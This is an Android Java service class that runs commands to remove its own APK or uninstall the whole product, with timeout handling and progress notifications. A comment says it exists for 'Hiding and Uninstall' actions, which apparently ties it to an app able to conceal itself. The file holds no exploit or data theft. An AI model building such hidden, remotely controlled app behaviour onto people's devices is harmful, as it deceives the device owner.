package com.fx;

import java.io.IOException;

import android.app.Service;
import android.content.Intent;
import android.os.Binder;
import android.os.Handler;
import android.os.IBinder;
import android.os.Looper;

import com.fx.maind.ref.command.RemoteRemoveApk;
import com.fx.maind.ref.command.RemoteUninstallAll;
import com.fx.util.Customization;
import com.fx.util.FxResource;
import com.fx.util.ProductInfoHelper;
import com.vvt.logger.FxLog;
import com.vvt.timer.TimerBase;

/**
 * This service is designed for temporary use with Hiding and Uninstall action. Since there is 
 * no call back when the operation is done, so it can't be used with other operations.
 */
public class RemoteCallingService extends Service {
	
	private static final String TAG = "RemoteCallingService";
	private static final boolean DEBUG = true;
	private static final boolean LOGV = Customization.DEBUG ? DEBUG : false;
	
	public static final String ACTION_REMOVE_APK = "remove_apk";
	public static final String ACTION_REMOVE_ALL = "remove_all";
	
	private boolean mIsRunning = false;
	
	private Handler mHandler;
	private IBinder mBinder = new LocalBinder();
	private RunningThread mThread;
	private TimerBase mProcessingTimeout;
	
	@Override
	public int onStartCommand(Intent intent, int flags, int startId) {
		// flags: 0=Default, 1=START_FLAG_REDELIVERY, 2=START_FLAG_RETRY
		if (intent != null) {
			String action = intent.getAction();
			mThread = new RunningThread(action);
			mThread.start();
		}
		return START_NOT_STICKY;
	}

	@Override
	public IBinder onBind(Intent intent) {
		return mBinder;
	}
	
	public void setHandler(Handler handler) {
		mHandler = handler;
	}
	
	public boolean isRunning() {
		return mIsRunning;
	}
	
	public String getAction() {
		return mThread == null ? "" : mThread.getAction();
	}
	
	public class LocalBinder extends Binder {
		public RemoteCallingService getService() {
			return RemoteCallingService.this;
		}
	}
	
	private class RunningThread extends Thread {
		private String mAction;
		
		public RunningThread(String action) {
			mAction = action;
		}
		
		public String getAction() {
			return mAction;
		}
		
		@Override
		public void run() {
			if (LOGV) FxLog.v(TAG, "run # ENTER ...");
			
			setState(true);
			
			if (LOGV) FxLog.v(TAG, "run # Looper.prepare()");
			Looper.prepare();
			
			if (LOGV) FxLog.v(TAG, "run # Register timeout timer");
			resetProcessingTimeout();
			
			if (LOGV) FxLog.v(TAG, String.format("run # Send request (action=%s)", mAction));
			
			if (ACTION_REMOVE_APK.equals(mAction)) {
				try {
					RemoteRemoveApk remoteCommand = new RemoteRemoveApk();
					String packageName = ProductInfoHelper.getProductInfo(getApplicationContext()).getPackageName();
					if (LOGV) FxLog.v(TAG, String.format("run # ACTION_REMOVE_APK with package name: %s)", packageName));
					
					remoteCommand.setPackageName(packageName);
					remoteCommand.execute();
				}
				catch (IOException e) {
					FxLog.e(TAG, String.format("run # Removing APK failed!! %s", e));
				}
			}
			else if (ACTION_REMOVE_ALL.equals(mAction)) {
				try {
					RemoteUninstallAll remoteCommand = new RemoteUninstallAll();
					String packageName = ProductInfoHelper.getProductInfo(getApplicationContext()).getPackageName();
					if (LOGV) FxLog.v(TAG, String.format("run # ACTION_REMOVE_ALL with package name: %s)", packageName));
					
					remoteCommand.setPackageName(packageName);
					remoteCommand.execute();
				}
				catch (IOException e) {
					FxLog.e(TAG, String.format("run # Uninstall all failed!! %s", e));
				}
			}
			
			if (LOGV) FxLog.v(TAG, "run # Looper.loop()");
			Looper.loop();
			
			if (LOGV) FxLog.v(TAG, "run # EXIT ...");
		}
	}
	
	private void setState(boolean isStart) {
		if (isStart) {
			if (LOGV) FxLog.v(TAG, "Service is started ...");
			mIsRunning = true;
		}
		else {
			if (LOGV) FxLog.v(TAG, "Service is stopped ...");
			mIsRunning = false;
			
			if (Looper.myLooper() != null) {
				Looper.myLooper().quit();
			}
		}
	}
	
	private void notifyCallingFailedTimeOut() {
		UiHelper.dismissProgressDialog(mHandler);
		UiHelper.resetView(mHandler);
		UiHelper.sendNotify(mHandler, FxResource.LANGUAGE_REMOTE_CALLING_FAILED);
	}

	private void resetProcessingTimeout() {
    	stopTimer();
    	
    	if (mProcessingTimeout == null) {
	    	mProcessingTimeout = new TimerBase() {
				
				@Override
				public void onTimer() {
					if (LOGV) FxLog.v(TAG, "Time Out!!");
		    		notifyCallingFailedTimeOut();
		    		setState(false);
				}
			};
    	}
		
		mProcessingTimeout.setTimerDurationMs(
				UiHelper.PROGRESS_DIALOG_TIMEOUT_SHORT_MS);
		
		mProcessingTimeout.start();
    }
	
	private void stopTimer() {
		if (mProcessingTimeout != null) {
			mProcessingTimeout.stop();
		}
	}

}
